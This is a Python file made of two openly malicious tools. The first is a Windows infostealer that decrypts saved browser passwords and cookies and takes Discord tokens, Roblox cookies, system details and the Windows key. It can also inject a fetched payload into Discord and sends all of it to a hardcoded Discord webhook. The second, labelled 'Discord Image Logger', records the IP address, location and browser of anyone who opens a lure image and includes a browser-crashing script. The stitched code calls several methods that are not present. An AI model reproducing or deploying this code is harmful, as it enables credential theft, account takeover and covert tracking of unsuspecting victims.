import os,json,shutil,base64,sqlite3,zipfile,requests,subprocess,psutil,random,ctypes,sys,re,datetime,time,traceback
from threading import Thread
from PIL import ImageGrab
from win32crypt import CryptUnprotectData

from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpagentparser

from Crypto.Cipher import AES
config = {
    # Key:
    'webhook': "https://discord.com/api/webhooks/1304490243910533172/ceZNHL_lfpNCSL4MF4HbR_l7cam-Q2Sxc3hSL7iRAiA8KNL9TZ8e0ygQfnZ9KSafXQxS",
    # Persist: Add to startup? (True/False, Bool)
    'persist': False,
    # Keep-Alive: Keep process running? (Will execute every hour, True/False, Bool)
    'keep_alive': False,
    # Injection URL: Raw URL to injection payload
    'injection_url': 'url to injection (raw)',
    # Inject: Inject payload into Discord? (True/False, Bool)
    'inject': False,
    # AntiVM: Protect against debuggers? (Recommended, True/False, Bool)
    'antivm': True,
    # HideConsole: Hide the console? (Similar to PyInstallers -w/--noconsole option, but less detections, (True/False, Bool)
    'hideconsole': False,
    # Force Admin: Bypass Admin Privileges? (May not work, True/False, Bool)
    'force_admin': False,
    # Black Screen: Make screen black? (True/False, Bool)
    'black_screen': False,
    # Error Message: Fake error text to display. (Leave Blank for None)
    'error': False,
    'error_message': 'This application failed to start because MSCVDLL.dll is missing.\n\nPlease download the latest version of Microsoft C++ Compiler and try again.'
}
class functions(object):
    def getHeaders(self, token:str=None, content_type="application/json") -> dict:
        headers = {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
        if token: headers.update({"Authorization": token})
        return headers
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f: local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception: return f'Failed to decrypt "{str(buff)}" | Key: "{str(master_key)}"'
    def fsize(self, path):
        path = internal.tempfolder + os.sep + path
        if os.path.isfile(path): size = os.path.getsize(path)/1024
        else:
            total = 0
            with os.scandir(path) as it:
                for entry in it:
                    if entry.is_file():
                        total += entry.stat().st_size
                    elif entry.is_dir():
                        total += self.fsize(entry.path)
            size = total/1024
        if size > 1024: size = "{:.1f} MB".format(size/1024)
        else: size = "{:.1f} KB".format(size)
        return size
    def gen_tree(self, path):
        ret = ""
        fcount = 0
        for dirpath, dirnames, filenames in os.walk(path):
            directory_level = dirpath.replace(path, "")
            directory_level = directory_level.count(os.sep)
            indent = "│ "
            ret += f"\n{indent*directory_level}📁 {os.path.basename(dirpath)}/"
            for n, f in enumerate(filenames):
                if f == f'Fentanyl-{os.getlogin()}.zip': continue
                indent2 = indent if n != len(filenames) - 1 else "└ "
                ret += f"\n{indent*(directory_level)}{indent2}{f} ({self.fsize((os.path.basename(dirpath)+os.sep if dirpath.split(os.sep)[-1] != internal.tempfolder.split(os.sep)[-1] else '')+f)})"
                fcount += 1
        return ret, fcount
    def system(self, action):
        return '\n'.join(line for line in subprocess.check_output(action, creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip())
class internal:
    tempfolder = None
    stolen = False
class ticks(functions, internal):
    def __init__(self,useless):
        del useless
        if config.get('error'): Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, config.get('error_message'), os.path.basename(sys.argv[0]), 0x1 | 0x10)).start()
        try: admin = ctypes.windll.shell32.IsUserAnAdmin()
        except Exception: admin = False
        if not admin and config['force_admin'] and '--nouacbypass' not in sys.argv: self.forceadmin()
        self.webhook = config.get('webhook')
        self.exceptions = []
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        dirs = [
            self.appdata,
            self.roaming,
            os.getenv('temp'),
            'C:\\Users\\Public\\Public Music',
            'C:\\Users\\Public\\Public Pictures',
            'C:\\Users\\Public\\Public Videos',
            'C:\\Users\\Public\\Public Documents',
            'C:\\Users\\Public\\Public Downloads',
            os.getenv('userprofile'),
            os.getenv('userprofile') + '\\Documents',
            os.getenv('userprofile') + '\\Music',
            os.getenv('userprofile') + '\\Pictures',
            os.getenv('userprofile') + '\\Videos'
        ]
        while True:
            rootpath = random.choice(dirs)
            if os.path.exists(rootpath):
                self.tempfolder = os.path.join(rootpath,''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
                break
        internal.tempfolder = self.tempfolder

        self.browserpaths = {
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
            'Edge': self.appdata + r'\\Microsoft\\Edge\\User Data',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data',
            'Amigo': self.appdata + r'\\Amigo\\User Data',
            'Torch': self.appdata + r'\\Torch\\User Data',
            'Kometa': self.appdata + r'\\Kometa\\User Data',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data',
            'Chrome Beta': self.appdata + r'\\Google\\Chrome Beta\\User Data',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data',
            'Iridium': self.appdata + r'\\Iridium\\User Data',
            'Chromium': self.appdata + r'\\Chromium\\User Data'
        }
        self.stats = {
            'passwords': 0,
            'tokens': 0,
            'phones': 0,
            'addresses': 0,
            'cards': 0,
            'cookies': 0
        }
        try:
            os.makedirs(os.path.join(self.tempfolder), 0x1ED, exist_ok=True)
            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x2)
            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x4)
            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x256)
        except Exception: self.exceptions.append(traceback.format_exc())
        os.chdir(self.tempfolder)
        if config.get('persist') and not self.stolen: Thread(target=self.persist).start()
        if config.get('inject'): Thread(target=self.injector).start()
        self.tokens = []
        self.robloxcookies = []
        self.files = ""
        
        threads = [Thread(target=self.screenshot),Thread(target=self.grabMinecraftCache),Thread(target=self.grabGDSave),Thread(target=self.tokenRun),Thread(target=self.grabRobloxCookie),Thread(target=self.getSysInfo)]
        for plt, pth in self.browserpaths.items(): threads.append(Thread(target=self.grabBrowserInfo,args=(plt,pth)))
        for thread in threads: thread.start()
        for thread in threads: thread.join()
        
        if self.exceptions:
            with open(self.tempfolder+'\\Exceptions.txt','w',encoding='utf-8') as f:
                f.write('\n'.join(self.exceptions))

        self.SendInfo()

        shutil.rmtree(self.tempfolder)
        if config.get('black_screen'): self.system('start ms-cxh-full://0')
    def tokenRun(self):
        self.grabTokens()
        self.neatifyTokens()
    def getSysInfo(self):
            with open(self.tempfolder+f'\\PC Info.txt', "w", encoding="utf8", errors='ignore') as f:
                try: cpu = self.system(r'wmic cpu get name').splitlines()[1]
                except Exception: cpu = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: gpu = self.system(r'wmic path win32_VideoController get name').splitlines()[1]
                except Exception: gpu = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: screensize = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
                except Exception: screensize = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: refreshrate = self.system(r'wmic path win32_VideoController get currentrefreshrate').splitlines()[1]
                except Exception: refreshrate = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: osname = 'Windows ' + self.system(r'wmic os get version').splitlines()[1]
                except Exception: osname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: systemslots = self.system(r'wmic systemslot get slotdesignation,currentusage,description,status')
                except Exception: systemslots = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: processes = self.system(r'tasklist')
                except Exception: processes = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: installedapps = '\n'.join(self.system(r'powershell Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName').splitlines()[3:])
                except Exception: installedapps = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: path = self.system(r'set').replace('=',' = ')
                except Exception: path = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: buildmnf = self.system(r'wmic bios get manufacturer').splitlines()[1]
                except Exception: buildmnf = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: modelname = self.system(r'wmic csproduct get name').splitlines()[1]
                except Exception: modelname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: hwid = self.system(r'wmic csproduct get uuid').splitlines()[1]
                except Exception: hwid = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: avlist = ', '.join(self.system(r'wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayname').splitlines()[1:])
                except Exception: avlist = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: username = os.getlogin()
                except Exception: username = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: pcname = self.system(r'hostname')
                except Exception: pcname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: productinfo = self.getProductValues()
                except Exception: productinfo = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: buildname = productinfo[0]
                except Exception: buildname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: windowskey = productinfo[1]
                except Exception: windowskey = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
                except Exception: ram = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
                except Exception: disk = 'N/A'; self.exceptions.append(traceback.format_exc())
                sep = '='*40
                f.write(f'''{sep}
                HARDWARE 
{sep}

CPU: {cpu}
GPU: {gpu}

RAM: {ram} GB
Disk Size: {disk} GB

PC Manufacturer: {buildmnf}
Model Name: {modelname}

Screen Info:
Resolution: {screensize}
Refresh Rate: {refreshrate}Hz

System Slots:
{systemslots}

{sep}
                   OS
{sep}

Username: {username}
PC Name: {pcname}

Build Name: {osname}
Edition: {buildname}
Windows Key: {windowskey}
HWID: {hwid}
Antivirus: {avlist}

{sep}
                  PATH
{sep}

{path}

{sep}
             INSTALLED APPS
{sep}

{installedapps}

{sep}
            RUNNING PROCESSES
{sep}

{processes}
''')

    def checkToken(self, tkn, source):
        try:
            r = requests.get(self.baseurl, headers=self.getHeaders(tkn))
            if r.status_code == 200 and tkn not in [token[0] for token in self.tokens]:
                self.tokens.append((tkn, source))
                self.stats['tokens'] += 1
        except Exception: self.exceptions.append(traceback.format_exc())
    def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            with open(bd, 'r', encoding="utf8", errors='ignore') as f:
                txt = f.read()
                content = txt.replace('api/webhooks', 'api/nethooks')
            with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
    def grabBrowserInfo(self, platform, path):
        if os.path.exists(path):
            self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.formatted_cookies = ''
            sep = '='*40
            fname = lambda x: f'\\{platform} Info ({x}).txt'
            formatter = lambda p, c, h, m: f'Browser: {platform}\n\n{sep}\n               PASSWORDS\n{sep}\n\n{p}\n{sep}\n                COOKIES\n{sep}\n\n{c}\n{sep}\n                HISTORY\n{sep}\n\n{h}\n{sep}\n               OTHER INFO\n{sep}\n\n{m}'
            profiles = ['Default']
            for dir in os.listdir(path):
                if dir.startswith('Profile ') and os.path.isdir(dir): profiles.append(dir)
            if platform in [
                'Opera',
                'Opera GX',
                'Amigo',
                'Torch',
                'Kometa',
                'Orbitum',
                'CentBrowser',
                '7Star',
                'Sputnik',
                'Chrome SxS',
                'Epic Privacy Browser',
            ]:
                cpath = path + '\\Network\\Cookies'
                ppath = path + '\\Login Data'
                hpath = path + '\\History'
                wpath = path + '\\Web Data'
                mkpath = path + '\\Local State'
                fname = f'\\{platform} Info (Default).txt'
                threads = [
                    Thread(target=self.grabPasswords,args=[mkpath,platform,'Default',ppath]),
                    Thread(target=self.grabCookies,args=[mkpath,platform,'Default',cpath]),
                    Thread(target=self.grabHistory,args=[mkpath,platform,'Default',hpath]),
                    Thread(target=self.grabMisc,args=[mkpath,platform,'Default',wpath])
                ]
                for x in threads:
                    x.start()
                for x in threads:
                    x.join()
                try: self.grabPasswords(mkpath,fname,ppath); self.grabCookies(mkpath,fname,cpath); self.grabHistory(mkpath,fname,hpath); self.grabMisc(mkpath,fname,wpath)
                except Exception: self.exceptions.append(traceback.format_exc())
            else:
                for profile in profiles:
                    cpath = path + f'\\{profile}\\Network\\Cookies'
                    ppath = path + f'\\{profile}\\Login Data'
                    hpath = path + f'\\{profile}\\History'
                    wpath = path + f'\\{profile}\\Web Data'
                    mkpath = path + '\\Local State'
                    fname = f'\\{platform} Info ({profile}).txt'
                    threads = [
                        Thread(target=self.grabPasswords,args=[mkpath,platform,profile,ppath]),
                        Thread(target=self.grabCookies,args=[mkpath,platform,profile,cpath]),
                        Thread(target=self.grabHistory,args=[mkpath,platform,profile,hpath]),
                        Thread(target=self.grabMisc,args=[mkpath,platform,profile,wpath])
                    ]
                    for x in threads:
                        x.start()
                    for x in threads:
                        x.join()
            with open(self.tempfolder+f'\\{platform} Cookies ({profile}).txt', "w", encoding="utf8", errors='ignore') as m, open(self.tempfolder+fname, "w", encoding="utf8", errors='ignore') as f:
                if self.formatted_cookies:
                    m.write(self.formatted_cookies)
                else:
                    m.close()
                    os.remove(self.tempfolder+f'\\{platform} Cookies ({profile}).txt')
                
                if self.passwords_temp or self.cookies_temp or self.history_temp or self.misc_temp:
                    f.write(formatter(self.passwords_temp, self.cookies_temp, self.history_temp, self.misc_temp))
                else:
                    f.close()
                    os.remove(self.tempfolder+fname)
    def injector(self):
        self.bypassBetterDiscord()
        for dir in os.listdir(self.appdata):
            if 'discord' in dir.lower():
                discord = self.appdata+f'\\{dir}'
                disc_sep = discord+'\\'
                for _dir in os.listdir(os.path.abspath(discord)):
                    if re.match(r'app-(\d*\.\d*)*', _dir):
                        app = os.path.abspath(disc_sep+_dir)
                        for x in os.listdir(os.path.join(app,'modules')):
                            if x.startswith('discord_desktop_core-'):
                                inj_path = app+f'\\modules\\{x}\\discord_desktop_core\\'
                                if os.path.exists(inj_path):
                                    f = requests.get(config.get('injection_url')).text.replace("%WEBHOOK%", self.webhook)
                                    with open(inj_path+'index.js', 'w', errors="ignore") as indexFile: indexFile.write(f)

    def getProductValues(self):
        try: wkey = self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
        except Exception: wkey = "N/A (Likely Pirated)"
        try: productName = self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName")
        except Exception: productName = "N/A"
        return [productName, wkey]
    def grabPasswords(self,mkp,bname,pname,data):
        self.passwords_temp = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_PASSWORDS.db'.replace(' ','_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(encrypted_password, master_key)
                if url != "":
                    self.passwords_temp += f"\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n"
                    self.stats['passwords'] += 1
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
    def grabCookies(self,mkp,bname,pname,data):
        self.cookies_temp = ''
        self.formatted_cookies = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_COOKIES.db'.replace(' ','_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = self.decrypt_val(r[2], master_key)
                if host != "":
                    self.cookies_temp += f"\nHost: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n"
                    self.formatted_cookies += f"{host}	TRUE	/	FALSE	1708726694	{user}	{decrypted_cookie}\n"
                    self.stats['cookies'] += 1
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())

# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted


__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1304490243910533172/ceZNHL_lfpNCSL4MF4HbR_l7cam-Q2Sxc3hSL7iRAiA8KNL9TZ8e0ygQfnZ9KSafXQxS",
    "image": "https://imgs.search.brave.com/VJU6KRc9iOkLE-Ay2iBAzkPCdF2WW08hDFZVlp81C1k/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly91cGxv/YWQud2lraW1lZGlh/Lm9yZy93aWtpcGVk/aWEvY29tbW9ucy80/LzQ2L1B1dGluLVhp/X3ByZXNzX2NvbmZl/cmVuY2VfKDIwMjMp/LmpwZw", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
